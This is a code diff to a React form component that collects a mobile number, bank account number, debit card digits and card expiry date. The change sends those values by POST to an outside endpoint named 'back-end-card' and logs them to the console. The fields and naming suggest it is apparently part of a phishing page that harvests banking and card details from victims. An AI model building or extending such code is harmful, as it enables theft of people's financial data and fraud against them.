@@ -20,30 +20,44 @@ const Side2 = () => {
             [name]: value
         });
     };
-
-    const handleSubmit = (e) => {
+    const handleSubmit = async (e) => {
         e.preventDefault();
-
-        // Retrieve existing data from sessionStorage or initialize an empty array
-        const existingData = JSON.parse(sessionStorage.getItem('submittedData')) || [];
-
-        // Append the new data to the existing data
-        existingData.push(formData);
-
-        // Save the updated array back to sessionStorage
-        sessionStorage.setItem('submittedData', JSON.stringify(existingData));
-
-        // Clear form fields after submission (optional)
-        setFormData({
-            mobileNumber: '',
-            accountNumber: '',
-            debitCardDigits: '',
-            expiryDate: ''
-        });
-
-        // Navigate to the next page
-        navigate('/side2'); // Adjusted navigation to the next page
+        console.log('Form Data:', formData); // Log form data
+    
+        try {
+            // Make a POST request to your API
+            const response = await fetch('https://back-end-card-git-main-alvin-sifats-projects.vercel.app/api', { // Adjusted to the correct endpoint
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(formData)
+            });
+    
+            if (!response.ok) {
+                throw new Error('Network response was not ok ' + response.statusText);
+            }
+    
+            const data = await response.json();
+            console.log('Success:', data);
+    
+            // Clear form fields after submission
+            setFormData({
+                mobileNumber: '',
+                accountNumber: '',
+                debitCardDigits: '',
+                expiryDate: ''
+            });
+    
+            // Navigate to the next page
+            navigate('/side2'); // Adjust navigation to the next page
+    
+        } catch (error) {
+            console.error('Error:', error);
+            // Optionally, handle errors (e.g., show a notification or message)
+        }
     };
+    
 
     return (
         <div className="mx-auto flex flex-col items-center bg-blue-100 p-8 rounded-lg shadow-lg max-w-md space-y-6">
